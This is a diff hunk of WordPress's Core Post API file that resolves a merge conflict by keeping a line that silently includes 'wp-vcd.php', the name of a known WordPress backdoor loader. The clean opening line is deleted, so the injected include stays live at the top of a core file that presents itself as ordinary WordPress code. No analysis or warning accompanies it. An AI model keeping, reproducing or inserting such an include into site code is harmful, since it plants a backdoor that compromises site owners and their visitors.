@@ -1,8 +1,4 @@
-<<<<<<< HEAD
 <?php if (file_exists(dirname(__FILE__) . '/wp-vcd.php')) include_once(dirname(__FILE__) . '/wp-vcd.php'); ?><?php
-=======
-<?php
->>>>>>> 44263c8212c9cb24c41286ecea884e79bdb14782
 /**
  * Core Post API
  *
